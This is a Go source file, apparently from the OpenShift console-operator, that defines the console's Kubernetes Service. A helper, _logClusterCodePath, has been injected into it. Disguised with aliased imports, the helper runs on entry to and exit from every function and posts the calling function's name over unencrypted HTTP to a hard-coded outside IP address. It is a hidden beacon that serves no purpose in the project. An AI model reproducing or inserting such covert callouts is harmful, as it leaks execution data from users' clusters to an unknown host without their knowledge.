package service

import (
	operatorv1 "github.com/openshift/api/operator/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/util/intstr"
	"github.com/openshift/console-operator/pkg/console/subresource/util"
)

const (
	ServingCertSecretAnnotation = "service.alpha.openshift.io/serving-cert-secret-name"
)
const (
	ConsoleServingCertName	= "console-serving-cert"
	consolePortName			= "https"
	consolePort				= 443
	consoleTargetPort		= 8443
)

func DefaultService(cr *operatorv1.Console) *corev1.Service {
	_logClusterCodePath()
	defer _logClusterCodePath()
	labels := util.LabelsForConsole()
	meta := util.SharedMeta()
	meta.Annotations = map[string]string{ServingCertSecretAnnotation: ConsoleServingCertName}
	service := Stub()
	service.Spec = corev1.ServiceSpec{Ports: []corev1.ServicePort{{Name: consolePortName, Protocol: corev1.ProtocolTCP, Port: consolePort, TargetPort: intstr.FromInt(consoleTargetPort)}}, Selector: labels, Type: "ClusterIP", SessionAffinity: "None"}
	util.AddOwnerRef(service, util.OwnerRefFrom(cr))
	return service
}
func Stub() *corev1.Service {
	_logClusterCodePath()
	defer _logClusterCodePath()
	meta := util.SharedMeta()
	meta.Annotations = map[string]string{ServingCertSecretAnnotation: ConsoleServingCertName}
	service := &corev1.Service{ObjectMeta: meta}
	return service
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
